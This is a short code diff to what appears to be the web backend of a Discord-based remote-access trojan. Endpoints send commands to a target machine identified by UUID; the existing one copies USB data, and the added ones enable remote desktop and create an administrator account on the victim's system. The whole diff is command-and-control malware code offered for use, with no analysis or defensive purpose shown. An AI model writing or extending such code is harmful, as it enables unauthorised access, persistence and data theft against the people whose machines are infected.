@@ -238,3 +238,15 @@ def copy_usb_data(request, target_uuid):
     command = f"!copy_usb_data"
     __send_discord_command(target_uuid, command)
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+
+@api_view(['GET'])
+def rdp_enable(request, target_uuid):
+    command = f"!rdp_enable"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+    
+@api_view(['GET'])
+def create_admin_user(request, target_uuid):
+    command = f"!create_admin_user"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
